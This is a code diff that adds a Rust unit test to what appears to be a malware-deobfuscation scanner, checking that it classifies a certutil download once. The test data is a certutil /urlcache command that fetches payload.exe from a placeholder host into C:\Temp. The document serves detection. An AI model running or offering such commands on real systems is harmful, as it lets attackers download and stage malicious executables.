@@ -11197,6 +11197,39 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
             env.traits
         );
     }
+
+    #[test]
+    fn slash_certutil_urlcache_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"certutil /urlcache /split /f https://slash-cert.example/payload.exe C:\Temp\payload.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "https://slash-cert.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "no structured CertutilDownload from slash urlcache: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("slash-cert.example/payload.exe"))
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "slash certutil URL double-emitted: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
